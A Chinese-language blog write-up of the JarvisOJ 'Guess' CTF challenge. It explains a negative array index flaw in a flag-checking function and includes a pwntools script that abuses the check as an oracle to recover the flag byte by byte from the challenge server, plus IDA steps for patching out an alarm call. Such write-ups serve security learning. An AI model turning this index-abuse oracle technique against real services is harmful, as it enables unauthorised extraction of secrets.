itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/jarvisOj_guess/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="ama2in9"><meta itemprop="description" content="Talking is cheap, show me the code."><meta itemprop="image" content="/images/head.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ama2in9"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/2018/11/25/jarvisOj_guess/" itemprop="url">javisOj->Guess</a></h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2018-11-25 16:38:24" itemprop="dateCreated datePublished" datetime="2018-11-25T16:38:24+08:00">2018-11-25</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/jarvisOj/" itemprop="url" rel="index"><span itemprop="name">jarvisOj</span></a></span></span> <span class="post-comments-count"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span><a href="/2018/11/25/jarvisOj_guess/#comments" itemprop="discussionUrl"><span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/11/25/jarvisOj_guess/" itemprop="commentCount"></span></a></span> <span id="/2018/11/25/jarvisOj_guess/" class="leancloud_visitors" data-flag-title="javisOj->Guess"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">Views:</span><span class="leancloud-visitors-count"></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="jarvis-gt-guess"><a href="#jarvis-gt-guess" class="headerlink" title="jarvis-&gt;guess"></a>jarvis-&gt;guess</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末摸鱼，看做出来的人数以为好做，结果GG，感觉这个题有点像以前看过的一道crypto，总结一下好了</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>下载下来的文件是用来本地测试的，开了socket，监听9999端口，其实就是模拟服务器跑的程序，所以本地通信建一个socket就好。重点是is_flag_correct()函数，是一个验证用户输入的函数，所以这个看起来更像一个逆向题。</p><p>调用这个函数前有一个fgets(inbuf,0x1000,stdin)，如果长度这么长，那么在flag_hexa = flag_hex的时候构造一个100*’A’+’\x00’即可绕过长度检查，造成溢出，不过这个测试之后发现好像没什么用，fuzz没什么异常，继续看函数，里面check flag是通过跟一个预存在栈上的flag数组对比确定的，但是是通过bin_by_hex这个数组做了一次映射确定，而这个数组初始化又是由0x401100LL地址上的数据完成的，有趣的是这个数组的0x30处正是0，其ascii码也是0x30，同理A-F的ascii码对应其数组的索引。因此这个比较只需要用户按顺序输入flag即可，这个比较当然不如直接让用户输入和flag对比来的快，所以这里面一定有什么设计。</p><p><img src="/2018/11/25/jarvisOj_guess/1.jpg" alt="code"><br><img src="/2018/11/25/jarvisOj_guess/2.jpg" alt="code2"><br><img src="/2018/11/25/jarvisOj_guess/3.jpg" alt="bin_by_hex"></p><h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><p>漏洞就出现在数组索引的检查，数组其实就是一个字符串指针，array[i]等同于*(array+i)，所以当i为负数时，其得到的数据是字符串指针低地址处的数据，这里的flag位置是ebp-0x150，bin_hex_index的位置在ebp-0x110，因此bin_hex_index[-0x40]即flag[0]，想要验证成功，只需value1 = 0,value2 = flag[i]。flag[i] = bin_hex_index[-0x40+i]，即用户输入chr(-0x40+i)，但是注意chr()范围是0-256，因此-0x40+i需要+0x100(模100类似格式化字符串以前的知识)，最终构造出一个完美验证通过的payload。<br>仅仅通过验证不是目的，我们还得知道真正的flag是什么，这里因为我们已经通过payload通过了验证，那么现在只需要修改Payload的第一、二字节，使其为ascii(20-127)，重复验证，一旦得到通过即可确定第一个字节，后面的也同理，两个字节两个字节的确定，直到所有payload都被替换成真正的flag</p><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"error"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'guess&gt; '</span>)</span><br><span class="line">    sh.sendline(data)</span><br><span class="line">    response = sh.recvline().strip(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">'Nope.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">init_payload = <span class="string">''</span></span><br><span class="line">offset = <span class="number">0x100</span><span class="number">-0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        init_payload += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        init_payload += chr(offset + (i<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> len(init_payload)</span><br><span class="line"><span class="comment">#init_payload = "504354467b3439643433313061313038353837353536373933323635316535353965313533636663386264323762340" + init_payload[95:]</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>,<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">128</span>):</span><br><span class="line">            temp = hex(j)[<span class="number">2</span>:]</span><br><span class="line">            init_payload = init_payload[:i] + temp.ljust(<span class="number">2</span>,<span class="string">'0'</span>) + init_payload[i+<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> guess(init_payload) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> str(i)+<span class="string">':'</span>+init_payload</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> init_payload</span><br><span class="line">flag = init_payload.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>中间recv会报timeout，可以修改for循环start，断点验证，之后hex_encode即可</p><h2 id="编外"><a href="#编外" class="headerlink" title="编外"></a>编外</h2><p>看别人的wp有说patch改掉alarm然后方便调试的，这里也记录一下吧，虽然自己没调试</p><p>找到call _alarm位置，option-&gt;general,number of opcode bytes改为8<br>选中mov edi,78h call _alarm,打开Edit-&gt;Patch Program-&gt;change bytes<br>最后Edit-&gt;Patch Program-&gt;Apply patches to input file</p><p><img src="/2018/11/25/jarvisOj_guess/5.jpg" alt="patch"><br><img src="/2018/11/25/jarvisOj_guess/6.jpg" alt="res"></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article></section><nav class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a> <a class="page-number" href="/">1</a><span class="page-number current">2</span></nav></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><section class="site-overview-wrap sidebar-panel sidebar-panel-active"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9"><p class="site-author-name" itemprop="name">ama2in9</p><p class="site-description motion-element" itemprop="description">Talking is cheap, show me the code.</p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/index.html"><span class="site-state-item-count">9</span> <span class="site-state-item-name">categories</span></a></div></nav></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2019</span><span class="with-love" id="animate"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">ama2in9</span></div><div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div> <span class="post-meta-divider">|</span><div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div><div class="busuanzi-count"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="site-uv" title="Total Visitors"><i class="fa fa-user"></i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span></span><span class="site-pv" title="Total Views"><i class="fa fa-eye"></i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script><script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script><script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script><script>AV.initialize("YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz","1fjf9mQl90nKdRPfq1zhDyIE")</script><script>function showTime(e){var t=new AV.Query(e),l=[],c=$(".leancloud_visitors");c.each(function(){l.push($(this).attr("id").trim())}),t.containedIn("url",l),t.find().done(function(e){var t=".leancloud-visitors-count";if(0!==e.length){for(var n=0;n<e.length;n++){var o=e[n],i=o.get("url"),r=o.get("time"),s=document.getElementById(i);$(s).find(t).text(r)}for(n=0;n<l.length;n++){i=l[n],s=document.getElementById(i);var u=$(s).find(t);""==u.text()&&u.text(0)}}else c.find(t).text(0)}).fail(function(e,t){console.log("Error: "+t.code+" "+t.message)})}function addCount(e){var t=$(".leancloud_visitors"),n=t.attr("id").trim(),o=(t.attr("data-flag-title").trim(),new AV.Query(e));o.equalTo("url",n),o.find({success:function(e){if(0<e.length){var t=e[0];t.fetchWhenSave(!0),t.increment("time"),t.save(null,{success:function(e){$(document.getElementById(n)).find(".leancloud-visitors-count").text(e.get("time"))},error:function(e,t){console.log("Failed to save Visitor num, with error message: "+t.message)}})}else{$(document.getElementById(n)).find(".leancloud-visitors-count").text("Counter not initialized! See more at console err msg."),console.error("ATTENTION! LeanCloud counter has security bug, see here how to solve it: https://github.com/theme-next/hexo-leancloud-counter-security. \n But you also can use LeanCloud without security, by set 'security' option to 'false'.")}},error:function(e){console.log("Error:"+e.code+" "+e.message)}})}$(function(){var e=AV.Object.extend("Counter");1==$(".leancloud_visitors").length?addCount(e):1<$(".post-title-link").length&&showTime(e)})</script><script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",model:{scale:1,hHeadPos:.5,vHeadPos:.618,jsonPath:"/live2dw/assets/hijiki.model.json"},display:{superSample:2,width:150,height:300,position:"right",hOffset:0,vOffset:-50},mobile:{show:!0,scale:.5},react:{opacityDefault:.7,opacityOnHover:.2},log:!1,tagMode:!1})</script></body></html>